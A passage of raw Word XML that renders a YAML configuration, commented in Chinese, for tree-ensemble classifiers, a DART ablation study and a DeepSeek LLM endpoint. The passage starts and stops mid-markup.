        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_depth: 24            # 20 几层的护栏；该数据量下单树自然只长到 18–20 层</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEE7078">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    min_samples_leaf: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E28ED1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    class_weight: balanced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4AD686">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_jobs: -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F310FC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E0BD02E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  xgboost:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0889E7F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_estimators: 300</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36790818">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_depth: 6             # 提升器标准深度，不用 24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA36E20">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    learning_rate: 0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505DB227">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    subsample: 0.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0BA3EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_jobs: -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472A9F34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A231E25">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  logistic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178EA5CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_iter: 1000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080CDEA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    class_weight: balanced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56574050">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BFADDAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 混合森林：Bagging 骨架 + 随机抽到的提升模型作基学习器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2403C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  hybrid_forest:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABF5C43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_estimators: 24         # 基学习器个数（每个都是一整个提升模型）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DC5180">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_depth: 24            # Bagging 骨架的深度约束</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668771E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_features: "sqrt"     # 每个基学习器看到的随机特征子集</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5416CDB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                             # ★ 实测（25 万行真实样本）：sqrt 让每成员只看到 8/78 维，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF33928">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                             #   reliable macro-F1 0.9899；改成 1.0 是 0.9986。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D84322A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                             #   随机特征子集是随机森林压方差的手段，提升器缺的不是方差而是信息，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E74F9B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                             #   砍特征等于让每轮残差学偏。想复现"随机森林进化版"的原始设定就留 sqrt，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E14300">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                             #   想拿最高指标就改 1.0，两者都写进报告对比。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59540835">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_depth: 6            # ★ 提升器内部浅树深度；设成 24 会退化成单棵大树</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E62C11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_rounds: 100         # 每个基学习器的提升轮数（多分类下每轮每类一棵树）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A05E9C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_pool: [xgboost, lightgbm, catboost]   # 每个基学习器随机三选一</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E226BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    random_state: 42</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63862666">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17457DEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 附：DART 消融实验（不参与五模型主对比，单列一节写进报告）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E59B14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 目的：验证"随机丢弃已建树"能否抑制提升器对噪声的过专门化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E633DBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 设计：固定基学习器为 LightGBM，只改 boosting_type 一处变量，避免混淆。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685E674A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 注意：CatBoost 没有 DART 实现，故不作为消融载体。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F15472C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  dart_ablation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DB6ECB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    enabled: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA16F59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_estimators: 24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317E0A7C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_features: "sqrt"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3935616A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_depth: 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D2E046">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_rounds: 100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D6F704">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    variants:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42186138">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">      - name: lgbm_plain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E11A2B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        boosting_type: gbdt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5072B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">      - name: lgbm_dart</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF60E1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        boosting_type: dart</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A2C689">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        drop_rate: 0.10      # 每轮随机丢弃 10% 已建好的树</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30589B0D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        skip_drop: 0.50      # 有一半概率整轮跳过丢弃，退回普通 GBDT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0DF15E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        max_drop: 50         # 单轮最多丢 50 棵</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681AACA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C791864">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>llm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BD2539">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  provider: deepseek        # deepseek / qwen，两者都走 OpenAI 兼容协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE13FD8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  base_url: https://api.deepseek.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E779663">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  model: deepseek-chat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C286D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  api_key_env: DEEPSEEK_API_KEY   # 从环境变量取名，不在此处写明文</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F38F0D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  temperature: 0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01698CA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  timeout: 30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9D3928">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
